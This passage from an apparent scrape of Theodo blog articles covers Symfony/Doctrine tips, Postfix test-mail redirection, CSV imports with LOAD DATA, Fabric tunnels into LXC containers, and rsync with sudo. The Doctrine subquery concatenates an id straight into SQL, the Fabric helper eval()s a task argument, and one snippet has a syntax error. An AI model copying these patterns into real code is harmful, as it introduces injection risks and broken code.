Shutdown the kernel.\r\n        $this->kernel->shutdown();\r\n\r\n        parent::tearDown();\r\n    }\r\n\r\n    protected function generateSchema()\r\n    {\r\n        // Get the metadata of the application to create the schema.\r\n        $metadata = $this->getMetadata();\r\n\r\n        if ( ! empty($metadata)) {\r\n            // Create SchemaTool\r\n            $tool = new SchemaTool($this->entityManager);\r\n            $tool->createSchema($metadata);\r\n        } else {\r\n            throw new Doctrine\\DBAL\\Schema\\SchemaException('No Metadata Classes to process.');\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Overwrite this method to get specific metadata.\r\n     *\r\n     * @return Array\r\n     */\r\n    protected function getMetadata()\r\n    {\r\n        return $this->entityManager->getMetadataFactory()->getAllMetadata();\r\n    }\r\n}\nComplete the test\n\r\n/**\r\n * Location class test\r\n *\r\n * @author Benjamin Grandfond \r\n * @since 2011-07-16\r\n */\r\nnamespace ParisStreetPingPong\\Bundle\\PsppBundle\\Entity;\r\n\r\nuse ParisStreetPingPong\\PsppBundle\\Tests\\TestCase;\r\n\r\nrequire_once dirname(__DIR__).'/TestCase.php';\r\n\r\nclass LocationTest extends TestCase\r\n{\r\n    ...\r\n    public function testGenerateLocalization()\r\n    {\r\n        $this->location->setAddress('14 Rue Notre-Dame-des-Victoires');\r\n        $this->location->setZipCode('75002');\r\n        $this->location->setCity('Paris');\r\n        $this->location->setCountry('FR');\r\n\r\n        // Save the location \r\n        $this->entityManager->persist($this->location);\r\n        $this->entityManager->flush();\r\n\r\n        $this->assertEquals('14 Rue Notre-Dame-des-Victoires 75002 Paris FR', $this->location->getLocalization());\r\n    }\r\n}\ngenerateLocalization implementation\nAnd now we only need to complete our Location entity and launch again our test that must pass \n\r\n// MyBundle\\Entity\\Location\r\n\r\n/**\r\n * @ORM\\Entity @ORM\\HasLifecycleCallbacks\r\n */\r\nclass Location\r\n{\r\n ...\r\n\r\n    /** @ORM\\PrePersist */\r\n    public function generateLocalization()\r\n    {\r\n        $localization = $this->getAddress().' ';\r\n        $localization .= $this->getZipCode().' ';\r\n        $localization .= $this->getCity().' ';\r\n        $localization .= $this->getCountry();\r\n\r\n        $this->setLocalization($localization);\r\n    }\r\n}\r\n\n\n\n#content #because-we-need-to-redo-the-blog\n{\n  line-height: 20px;\n}\n#content #because-we-need-to-redo-the-blog .with-separator\n{\n  margin-top: 50px;\n}\n#content #because-we-need-to-redo-the-blog h4\n{\n  margin-top: 25px;\n}\n#content #because-we-need-to-redo-the-blog h4,\n#content #because-we-need-to-redo-the-blog p,\n#content #because-we-need-to-redo-the-blog pre,\n#content #because-we-need-to-redo-the-blog ul\n{\n  margin-bottom: 15px;\n}\n#content #because-we-need-to-redo-the-blog li\n{\n  margin-bottom: 10px;\n}\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nSymfony2 has been around for quite a while. Personally, I love how much PHP-oriented it is. It feels much closer to the language base than the first version of the framework. It means less of the magic and more of the important decisions in the hands of the\u00a0development\u00a0team. But there is no real framework without some magic, which is sometimes really hard to master.\nEnough of the introduction, it is time for the technical stuff. First, let us take a look at some user cases:\n\nAs the bundle base grows, we see or might see soon a lot of bundles which would make heavy use of the database \u2013 blogs, forums, eCommerce\u2026 Let\u2019s say we want to integrate such a bundle with our EnormousWebsiteBundle. Easy, isn\u2019t it? But wait! We did not think of prefixing our table names (who does?), and neither did the author of the bundle. And all of a sudden we have conflicts everywhere.\nWe have some databases that already exist. And the client wants us to make an application that uses all of them.\nWe want to backup different sets of data\u00a0at different frequencies.\nWe need to\u00a0optimize our application, using different data storage solutions: a SQL database, a NoSQL database, etc.\n\nIn all those cases one of the solutions (or a necessity) is to use multiple databases. So let us do some Symfony2 magic!\nIt begins in config.yml\nLets say we have a simple blog bundle, which we want to adapt to use its own database. The easy part is configuring the connection:\ndoctrine:\r\n    dbal:\r\n        connections:\r\n            ...\r\n            blog:\r\n                driver:   %blog.database_driver%\r\n                host:     %blog.database_host%\r\n                dbname:   %blog.database_name%\r\n                user:     %blog.database_user%\r\n                password: %blog.database_password%\r\n                charset:  UTF8\nNext, create a second entity manager:\ndoctrine:\r\n    orm:\r\n        entity_managers:\r\n            ...\r\n            blog:\r\n                connection:   blog\r\n                mappings:\r\n                    MyAwesomeBlogBundle: ~\nWell, we can say that your bundle is configured.\nTry to use your second database\nIt is easy to find in the official documentation that you can simply do\n$this->get('doctrine')->getEntityManager($name)\nto use your custom entity manager. But I guess you never actually had to do it, being happy with the default one. So this will require some refactoring. The simplest solution is to specify a parameter in your config, let\u2019s say:\nparameters:\r\n    my_awesome_blog.entity_manager.name: blog\nIf you\u2019re going to publish your bundle, set it to \u2018default\u2019, in case somebody wouldn\u2019t want to use a separate EM, and you should be safe. Now, you need to pass the parameter to each (well, most of) getEntityManager calls in your bundle. It will be a bit of work, depending on the was you used that function. Let\u2019s hope you defined some services, like this one:\nmy_awesome_blog.content_repository:\r\n    class: %my_awesome_blog.content_repository.class%\r\n    arguments: ['@doctrine.orm.entity_manager']\nor some functions like\n$this->getEntityManager()\nin your controllers. Don\u2019t worry about the extra work, at least it will help you to decouple your code even more (and we like loosely coupled code, don\u2019t we?).\nIs it all?\nIt depends. These are the basics. Things are getting tricky when:\nYou need to login with an entity which is not in the default entity manager\nYou will need to overwrite the user provider, and pass your custom entity manager to it. In the\u00a0simplest\u00a0form it will be something like that:\n# security.yml\r\nsecurity:\r\n    providers:\r\n        blog_user:\r\n            id: my_awesome_blog.user_provider #this is the name of your service\nNow you need to register a simple service which will use your custom entityManager:\n# services.yml\r\nparameters:\r\n    my_awesome_blog.user_provider.class: Symfony\\Bridge\\Doctrine\\Security\\User\\EntityUserProvider\r\n    my_awesome_blog.user_provider.user.class: MyCompany\\MyAwesomeBlogBundle\\Entity\\User\r\n    my_awesome_blog.user_provider.user.parameter: username\r\n\r\nservices:\r\n    my_awesome_blog.user_provider:\r\n        class: %my_awesome_blog.user_provider.class%\r\n        arguments:\r\n            - '@doctrine.orm.blog_entity_manager'\r\n            - %my_awesome_blog.user_provider.user.class%\r\n            - %my_awesome_blog.user_provider.user.parameter%\nThis one will allow you to use a standard \u201cform_login\u201d configuration, as long as you pass the provider to your firewall (see security reference if you\u2019re not familiar with the config options: http://symfony.com/doc/2.0/reference/configuration/security.html).\nYou have some forms that use your entities\nThis one is a little tricky. By default most of internal functions use\n$container->get('doctrine')->getEntityManager()\nwhich just doesn\u2019t work with multiple EM\u2019s. You\u2019ll get errors saying you Entity is not an Entity (feels like JavaScript!). Don\u2019t worry it is an Entity, just not\u00a0registered\u00a0in that manager. I\u2019ve recently made a pull request about this issue\u00a0(here), and it got into symfony:master, but if you still use 2.0 you have to take the matters in your own hands [update: The PR is merged in Symfony 2.1]. So far I\u2019ve found one class that needs to be changed (see the pull request). Simply change the few mentioned lines of code, save it in your bundle and add this to your services\u2019 parameters:\ndoctrine.orm.validator.unique.class:\r\n    MyCompany\\MyAwesomeBlogBundle\\Validator\\Constraints\\BlogUniqueEntityValidator\nWell, if you ever find anything else, and you don\u2019t feel like defining your very own service, just try to use the awesome getEntityManagerForClass() function and overload some default classes.\nGood luck!\nDefining your own entity manager seems easy. This part of Symfony2 configuration is awesome. It is easy, as long as you\u2019re not trying to force it to do some more complicated stuff. After a certain point, you find a bunch of default services, which you need to redefine/overload/give up on using at all. Well,\u00a0whether\u00a0you really need to do this, or just want to see how it would be like\u2026 I wish you best of luck, and don\u2019t forget to share your experience!\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nSometimes you just need to output the number of objects related to another, but this simple operation can be a major blow performance-wise. I hope this trick I use a lot in my\u00a0symfony +\u00a0doctrine developments\u00a0will save you some time.\nLet\u2019s consider a blog that allows you to tag your posts:\nBlogPost:\r\n  columns:\r\n    title: string(255)\r\n    body: clob\r\n  relations:\r\n    Tags:\r\n      class: Tag\r\n      foreignAlias: BlogPosts\r\n      refClass: BlogPostTag\r\n      local: blog_post_id\r\n      foreign: tag_id\r\n\r\nTag:\r\n  columns:\r\n    name: string(255)\r\n\r\nBlogPostTag:\r\n  columns:\r\n    blog_post_id:\r\n      type: integer\r\n      primary: true\r\n    tag_id:\r\n      type: integer\r\n      primary: true\r\n  relations:\r\n    BlogPost:\r\n      local: blog_post_id\r\n      foreign: id\r\n      foreignAlias: BlogPostTags\r\n    Tag:\r\n      local: tag_id\r\n      foreign: id\r\n      foreignAlias: BlogPostTags\nYou can retrieve this schema in the symfony 1.x documentation\nNow, we build an admin generator which shows the number of tags per blog post on the list, with 20 results per page. This means we will have 1 SQL request to retrieve the 20 posts and 1 SQL request per post to retrieve the tag count. Taking into account the count request of the pager, we will have a total of 22 requests. This will get worse if we choose to display more blog posts at a time.\nThere is a way to optimize this with Doctrine!\nAdd count into the query\nLet\u2019s add the calculation of the tag count to the request that retrieves the blog posts.\nIt could look like that:\n  // lib/model/doctrine/BlogPostTable.class.php\n  /**\n   * Find a blog post by its id.\n   * @param integer $id\n   * @return BlogPost|false\n   */\r\n  public function findById($id)\r\n  {\r\n    // Subquery that counts the number of tags per post.\r\n    $sub_query = '(SELECT COUNT(t.id) FROM BlogPostTag t WHERE blog_post_id = '.$id.')';\r\n\r\n    $query = $this->createQuery('bp')\r\n      ->select('bp.*')\r\n      ->addSelect($sub_query.' as nb_tags') // the number of tags will be in the nb_tags variable\r\n      ->where('bp.id = ?', $id);\r\n\r\n    return $query->execute();\r\n  }\nExplanations\n\nThe $subquery counts the number of tags for the blog post in SQL (more about Doctrine 1.2 subqueries).\nCreate a query that retrieves blog post by its id\nAdd the $subquery into the select with an alias \u2018nb_tags\u2019. You have to specify what you want to select first to use the addSelect method, otherwise it will not work.\nReturn the execution of the query\n\nResult\nThe result of the query should be an instance of a Doctrine_Record (false if no blog post is found) which contains the result of the subquery into its protected array $_values. As it is a protected attribute of the Doctrine_Record class it can be accessed in your BlogPost model class.\nCreate a smart getter\nSo now that we get the value of \u2018nb_tags\u2019 into the hydrated record we can write a getter that returns this value in a smart way.\nFirst of all, you should add an attribute to your model class to store the number of tags:>\n  // lib/model/doctrine/BlogPost.class.php\r\n\r\n  /**\r\n   * The number of tags of the blog post.\r\n   * @var Integer\r\n   */\r\n  protected $nb_tags = null;\nThen, implement the getNbTags() that will return the value of the \u2018nb_tags\u2019 key in the $_values array of the doctrine record. But what if the record has been found by using another query? The \u2018nb_tags\u2019 will not exist so you have to test it otherwise you might face an exception. This is how you should write your getter:\n  // lib/model/doctrine/BlogPost.class.php\r\n\r\n  /**\r\n   * Return the number of tags related to the blog post.\r\n   *\r\n   * @return Integer\n   */\r\n  public function getNbTags()\r\n  {\r\n    // The number of tags is not yet set\r\n    if (is_null($this->nb_tags)\r\n    {\r\n      // the variable added in the SQL request will be found in the $_values of the doctrine record\r\n      if (isset($this->_values['nb_tags']))\r\n      {\r\n        $this->nb_tags = $this->_values['nb_tags'];\r\n      }\r\n      else\r\n      {\r\n        /**\r\n         * The number of tags has not been set in the SQL request\r\n         * Doctrine will lazy load every tag and count them all.\r\n         * This could be optimized by overwriting the createQuery method,\r\n         * adding a left join to the tag table automatically in BlogPostTable.class.php\r\n         * (beware, it can lead to unwanted side effects)\r\n         */\r\n        $this->nb_tags = $this->getTags()->count();\r\n      }\r\n    }\r\n\r\n    return $this->nb_tags;\r\n  }\nConclusion\nSo what have we achieved? Simple: we reduced the number of SQL requests in our admin gen from 22 to 2! One to retrieve the blog posts with the number of related tags, and the other by the Doctrine pager. Obviously, this trick isn\u2019t restricted to admin generators, so think of the many situations where you can use it!\n\n\n#content #because-we-need-to-redo-the-blog\n{\n  line-height: 20px;\n}\n#content #because-we-need-to-redo-the-blog .with-separator\n{\n  margin-top: 50px;\n}\n#content #because-we-need-to-redo-the-blog h4\n{\n  margin-top: 25px;\n}\n#content #because-we-need-to-redo-the-blog h4,\n#content #because-we-need-to-redo-the-blog p,\n#content #because-we-need-to-redo-the-blog pre,\n#content #because-we-need-to-redo-the-blog ul\n{\n  margin-bottom: 15px;\n}\n#content #because-we-need-to-redo-the-blog li\n{\n  margin-bottom: 10px;\n}\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tVersion fran\u00e7aise plus bas\nSave the date! Theodo will be present at the Open World Forum, as I have been selected to talk about \u201cAdpoting devops philosophy\u201d on Friday Sept. 23 at 16:30.\nMore info about the conference here: http://www.openworldforum.org/Conferences/Adopter-la-philosophie-DevOps\nI am very happy to be able to spread the good word in such an important conference! The main purpose will be to explain how devops extends agility and its concepts to the whole lifecycle of an IT project, including deployment and system administration and how this can improve the productivity and responsiveness of your IT organization.\nSee you there!\n\u2014\nR\u00e9servez votre vendredi 23 septembre ! Theodo sera pr\u00e9sent \u00e0 l\u2019Open World Forum, j\u2019ai en effet \u00e9t\u00e9 s\u00e9lectionn\u00e9 pour intervenir comme conf\u00e9rencier sur \u201cComment adopter la philosophie devops\u201d ce vendredi 23/9 \u00e0 16:30.\nPlus d\u2019informations sur la conf\u00e9rence ici: http://www.openworldforum.org/Conferences/Adopter-la-philosophie-DevOps\nJe suis tr\u00e8s content de pouvoir r\u00e9pandre la bonne parole devant un nouveau public. Mon objectif sera d\u2019expliquer comment la philosophie devops \u00e9tend les concepts d\u2019agilit\u00e9 \u00e0 tout le cycle de vie d\u2019un projet informatique, d\u00e9ploiement et maintenance incluse et comment ces concepts peuvent augmenter la productivit\u00e9 et la r\u00e9activit\u00e9 de votre organisation informatique.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFear you will send the unwanted emails to other people when testing your software?\nIf you use Postfix, you can follow these simple steps:\nPut into /etc/postfix/main.cf:\nsmtp_generic_maps = regexp:/etc/postfix/generic\nAnd into /etc/postfix/generic:\n/.*/ laurentb+test@theodo.fr\nReload postfix (this might depend on your distribution):\n# /etc/init.d/postfix reload\nThis will rewrite all emails sent from your machine to send only to the email address provided.\nOf course, change the destination email. I get enough emails already!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLaurent Bachelier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWe often have to face the problem of importing data off an Excel file with thousands lines.\nPHP is not suited for this task, it\u2019s slow and there is a high risk for the import to crash due to \u201cmemory limit\u201d or some other annoying stuff like that!\nSo instead we chose a better way by using pure SQL which is much faster at this kind of operation.\nAt first, you must convert your Excel file to CSV (Excel does it very well). Be careful to choose the right field separator: I generally use \u201c~\u201d because there is little chance of finding this character in your written data.\nSteps:\n\nCreate a temporary table that matches exactly the structure of the Excel file\nFill the temporary table with the CSV file\nRun SQL queries to fill your database\n\nPractical example:\nSuppose we have an Excel file containing thousands of users that must be dispatched to several tables depending on their type.\nCSV file sample:\n        User 1~user1@theodo.fr~0987564321~user~~~\r\n        User 2~user2@theodo.fr~0134256789~user~~~\r\n        User 3~user3@theodo.fr~0128971271~user~~~\r\n        Agent 1~agent1@company.com~0486282688~agent~Company 1~Role 1~0987654321\r\n        Agent 2~agent2@company.com~0176254621~agent~Company 2~Role 2~0445664332\r\n        User 4~user4@company.com~0456789856~user~~~\n1. Create the temporary table\nWe will create a table contain the following fields:\n\nname\nemail\nphone\ntype\ncompany_name\nagent_role\ncompany_phone\n\nDROP TABLE IF EXISTS user_tmp;\r\nCREATE TABLE user_tmp (\r\n        name\t varchar(127),\r\n        email varchar(127),\r\n        phone varchar(20),\r\n        type varchar(20),\r\n        company_name\tvarchar(127),\r\n        agent_role varchar(127),\r\n        company_phone varchar(20),\r\n        id int(11) NOT NULL auto_increment,\r\n        PRIMARY KEY (`id`),\r\n        UNIQUE KEY `IDX_ATTRIBUTE_VALUE` (`id`)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n2. Fill the temporary table\nImport your CSV file into the temporary table:\n    LOAD DATA LOCAL INFILE 'PATH_TO_YOUR_CSV_FILE/users.csv'\r\n        INTO TABLE user_tmp CHARACTER SET 'utf8' FIELDS TERMINATED BY '~' LINES TERMINATED BY '\\n';\n3. Fill your own tables\nSuppose you have the following two tables:\nUser\n\nname\nphone\nemail\n\nAgent\n\nname\nphone\nemail\ncompany_name\nrole\ncompany_phone\n\nInsert data with SQL queries:\nINSERT INTO user (name, phone, email)\r\n    SELECT name, phone, email FROM user_tmp WHERE type = 'user';\nINSERT INTO agent (name, phone, email, company_name, role, company_phone)\r\n    SELECT name, phone, email, company_name, agent_role, company_phone FROM user_tmp WHERE type = 'agent';\nAll done! Your tables are complete.\nThis is a simple example, you can use this method to make more complex data imports (with joins). All you need to do is to adapt your SQL queries.\nHere we have seen how we can leverage something fast but apparently limited (LOAD DATA) and make it powerful, by using a temporary table and SQL requests inserting data into the actual tables.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWith the intent of testing our projects in separate environments, I have been working recently on simple fabric scripts for automating LXC containers creation; a basic one can be found at https://github.com/raphaelpierquin/fabulxc, however the context was slightly more complicated here, since we intended to create those on our remote test server and not locally. A more thorough (and specific) installation was also required, with database creation, automated symfony projects installation and server deployment.\nIn the following tutorial, I adopted a \u201cget things done\u201d mindset. There are many nice-to-haves that will be implemented in the future, such as defining the containers\u2019 ips by DHCP and not statically.\nFor the most part, the LXC creation is pretty straightforward and requires basically the replacement of the\nlocal\ncalls by\nrun\ncalls in fabulxc.\nThe root directory of container cont_name is accessible under\n/var/lib/lxc/cont_name/rootfs/,\nwhich allows for adding or modifying files. For instance adding your public key for authentication is pretty easy since we can copy it directly from the remote server at\n/var/lib/lxc/cont_name/rootfs/root/.ssh/authorized_keys :\nthat can be done even before starting the lxc container.\nThe first real issue is to be able to work inside the containers: in order to install packages or launch a service however, we want our script to be able to access the container itself. Working inside the container, itself in a remote server, is going to require tunneling through the server.\nTunneling seems sadly not to be fully supported by fabric (cf open issue https://github.com/fabric/fabric/issues/38, apparently there are some issues related to paramiko), so after having a quick look at the existing options I could find (https://gist.github.com/e3e96664765748151c05 and https://gist.github.com/e3e96664765748151c05), I chose to go the simple way*, i.e. do it myself by hand :\ndef open_tunnel(ip):\r\nprint 'Opening tunnel'\r\nprocess = subprocess.Popen(['ssh', '-N', '-L1248:' + ip + ':22', 'root@example.theodo.fr']);\r\nsleep(2)\r\nreturn process\r\n\r\ndef close_tunnel(process):\r\nprint 'Closing tunnel'\r\nprocess.terminate()\r\n\r\n#Calls a function inside a tunnel\r\n@task\r\n@hosts('root@127.0.0.1:1248')\r\ndef tunnel_wrap(function_name, name):\r\n#finds the (static) ip of the container\r\nwith settings(host_string = 'root@example.theodo.fr:22'):\r\nip = get_container_ip(name)\r\nfunction = eval(function_name)\r\np = open_tunnel(ip)\r\nwith settings(warn_only=True):\r\nfunction(name)\r\nclose_tunnel(p)\n\nSay we want to install our packages and have defined an\n\ninstall_packages\nfunction, we only need to call\ntunnel_wrap (\u2018install_packages\u2019, cont_name)\nto install the packages for the container \u201ccont_name\u201d.\nBasically, we just open a tunnel on port 1248 to the desired container, execute our function, then close the tunnel.\nThe\nwarn_only=True\nenvironment setting allows the closing of the tunnel even when the executed function sends back an error (since fabric stops by default at the first failure).\n*This is obviously only a workaround, but it serves our purpose quite well. I intend to be testing the solutions cited before soon, though, hopefully there will be a post about that later :).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Henri Cumenge\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tMy conference about adopting DevOps philosophy on Symfony projects is now online! You can see (and listen to) me speaking here: http://symfony.com/video/Paris2011/573\nIn this presentation you will see what I think is the philosophy behind the DevOps movement and how to start with the 4 important aspects of adopting DevOps:\n\nConfiguration Management with Puppet\nDevelopment on the production environment with Vagrant\nDeployment automation with Fabric\nContinuous deployment with Jenkins\n\n\nIf you are interested by the DevOps movement and you happen to be in Paris, come to our Paris-DevOps meetups. After the two first meetups hosted by Theodo, the meetup is now traveling to other locations. The next one will be held on the 4th of May at Xebia\u2019s office. More info here: http://parisdevops.fr/\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tsfEasyGMapPlugin 1.0.4 is out and the good news is : the plugin is the 24th most used symfony plugin among the 457 available on http://www.symfony-project.org/plugins/ ! We are now 5 official developers, not counting all the developers I work with who contribute indirectly.\nIt all started because I was amazed by the success of the Phoogle library on the Internet despite its limited number of functionalities. And since almost all my projects involved a Google Map I wanted to create a plugin containing all the core functionalities I always reuse. Now I am happy to see the popularity of the plugin and am looking forward further possible developments that will continue in the spirit of including as many core functionalities of Google Maps-based application in the plugin.\nNew functionalities for the moment include :\n\nMore precise Mercator projections to convert GPS coordinates into Google Pixel coordinates and back GMapCoord::fromPixToLat, GMapCoord::fromLatToPix, etc.\nAdded the GMapBounds::getBoundsContainingMarkers(\u2026) function\nAdded the GMap::centerAndZoomOnMarkers() function which enables to guess zoom and center of the map to fit the markers. Center is easy to guess. Zoom uses width and height of smallest bound, pixel width and height of the map and Mercator projection\nAdded tomr\u2019s contribution: it is now possible to add multiple controls to the map\nAdded the GMapCoord::distance($coord1, $coord2) function which gives an estimation of the distance between two coordinates\nAdded the very useful function $gMap-> getBoundsFromCenterAndZoom(\u2026) which enables one to calculate server-side the bounds corresponding to specific center coordinates, zoom, and map size. This is the equivalent of the client-side map.setCenter(\u2026,\u2026);map.setZoom(\u2026);map.getBounds(); It uses the Mercator projection formulas as used by the Google Maps\nA new function $gMapMarker->isInsideBounds($bounds)\nA lot of unit tests\nAnd two new samples\n\nPlease, feel free to suggest what you consider typical core functionalities of your Google Maps-based applications.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis issue might be familiar to some of you:\u00a0you have ssh access to a server with sudo rights on it and you want to transfer files with rsync. However, since these files are not directly accessible\u00a0from your ssh user (because they belong to some other user), the rsync fails with\nrsync: mkstemp \"XXX\" failed: Permission denied (13)\nrsync error: some files could not be transferred (code 23)\nif you tried to write a file in a protected directory or\nrsync: send_files failed to open \"XXX\": Permission denied (13)\nrsync error: some files could not be transferred (code 23)\nif you tried to read a protected file.\nHere is the simple procedure to solve this problem and transfer the files in one go:\n\nAuthenticate with sudo, which by default will cache your authorization for a short time\nThen use your favorite transfer program with one small change: use sudo on the remote end\n\nAuthenticating with sudo\nssh -t user@host \"sudo -v\"\nThe -v option of sudo option will either give you five more minutes of \u201cfree sudoing\u201d, or ask for your password. The -t option of ssh forces an interactive session, so that sudo is able to ask for your password.\nIf for some reason your password is displayed on your screen, you can run stty -echo before and stty echo after to hide it.\nTransferring the file\nIf you want to get the /root/protected.txt file for example, you will then have to use rsync\u00a0in the following way:\nrsync --rsync-path='sudo rsync' user@host:/root/protected.txt ./\nYou can use any rsync command as long as you have the correct rsync-path, which by default is just \u201crsync\u201d.\nThis tip can work with other programs besides rsync, as long as it lets you change the remote program that will be executed. For instance, you can change the --receive-pack option for git push.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLaurent Bachelier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI had the chance to spread the good word by talking about adopting DevOps in Symfony projects at the Symfony Live conference. The feedback was very good (for those who attended and have not done so yet, you can give some feedback here:\u00a0http://joind.in/talk/view/2756) You can also find the slides here:\u00a0http://www.slideshare.net/mobile/fabrice.bernhard/adopt-devops-philosophy-on-your-symfony-projects and the source code of the slides here:\u00a0https://github.com/fabriceb/sflive2011-devops)\nOne of the very good news is that I convinced many people (as observed on twitter) to start using vagrant after the conference. The slides gave a quick introduction, so let me give here a more detailed tutorial on how to start using vagrant.\nIntroduction to Vagrant\nVagrant is a ruby tool that makes the process of testing your code in a virtual machine VERY easy. You are concerned:\n\nIf you are a developer on a complex project with a specific system configuration on the production server that you want to reproduce in your development environment painlessly. This specific system configuration can be specific versions of some packages, a specific architecture or simply a specific OS.\nIf you are a Mac user! Because the chances that the project you develop will be hosted on a Mac are quite small\u2026\n\nIt is quite amazing to see how many people develop on Macs to deploy on Linux systems and don\u2019t use virtual environments. This has two obvious downsides:\n\nyou need to install a working development environment on your Mac which can quickly become a pain.\neven with PHP applications, which are usually quite platform-independent, it is never truly the case and it is much better to avoid last-minute 